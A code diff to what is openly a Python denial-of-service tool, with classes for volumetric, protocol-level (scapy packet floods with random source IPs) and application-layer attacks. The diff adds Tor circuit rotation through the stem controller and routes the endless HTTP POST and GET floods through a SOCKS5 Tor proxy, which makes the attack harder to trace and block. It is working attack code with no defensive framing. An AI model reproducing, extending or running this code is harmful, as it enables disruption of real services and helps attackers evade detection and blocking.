@@ -5,12 +5,24 @@ import time
 import ping3
 import platform
 from scapy.all import IP, TCP, send, RandShort
+from stem import Signal
+from stem.control import Controller
+
+ 
+def set_new_ip():
+    """Change IP using TOR"""
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate(password='tor_password')
+        controller.signal(Signal.NEWNYM)
 
 def random_ip():
     return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
 
 def random_port():
     return random.randint(1024, 65535)
+
+def random_Count():
+    return random.randint(1, 6)
 
 class VolumeBasedAttack:
     @staticmethod
@@ -154,7 +166,9 @@ class ProtocolAttack:
 
                     send(pkt, verbose=0, loop=1)
 
-        print(f"Pacchetto inviato da {ip_packet.src}:{tcp_packet.sport} a {ip_packet.dst}:{tcp_packet.dport}")
+        print(f"packet sendo from {ip_packet.src}:{tcp_packet.sport} to {ip_packet.dst}:{tcp_packet.dport}")
+        
+
 
 class ApplicationLayerAttack:
     @staticmethod
@@ -163,15 +177,24 @@ class ApplicationLayerAttack:
         print("Using POST method to:", vector)
         print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
         time.sleep(10)
-        count = 0  
 
         while True:
-            for target in vector:
-                if count % 4 == 0:  
-                    src_ip = random_ip()
-                    print(f"Changing source IP to: {src_ip}")
+            random_count = random.randint(3, 10)  
+            count = 0  
 
-                response = res.post(target, data=bye) 
+            for target in vector:
+                if count >= random_count:  
+                    set_new_ip()  
+                    print("Changed IP using Tor.")
+                    random_count = random.randint(3, 10)  
+                    count = 0 
+
+                proxies = {
+                    'http': 'socks5h://127.0.0.1:9050',
+                    'https': 'socks5h://127.0.0.1:9050'
+                }
+
+                response = res.post(target, data=bye, proxies=proxies)
                 print(response.text)
                 count += 1
 
@@ -181,20 +204,30 @@ class ApplicationLayerAttack:
         print("Using GET method to:", vector)
         print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
         time.sleep(10)
-        count = 0  
 
         while True:
+            random_count = random.randint(3, 10)  
+            count = 0  
+
             for target in vector:
-                if count % 4 == 0:  
-                    src_ip = random_ip()
-                    print(f"Changing source IP to: {src_ip}")
+                if count >= random_count: 
+                    set_new_ip() 
+                    print("Changed IP using Tor.")
+                    random_count = random.randint(3, 10) 
+                    count = 0  
+
+                proxies = {
+                    'http': 'socks5h://127.0.0.1:9050',
+                    'https': 'socks5h://127.0.0.1:9050'
+                }
 
                 headers = {
                     'Connection': 'keep-alive',
                     'Content-Length': str(len(bye)),
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                 }
-                response = res.get(target, headers=headers, stream=True)
+                
+                response = res.get(target, headers=headers, proxies=proxies, stream=True)
 
                 for chunk in response.iter_content(chunk_size=4096):
                     if chunk:
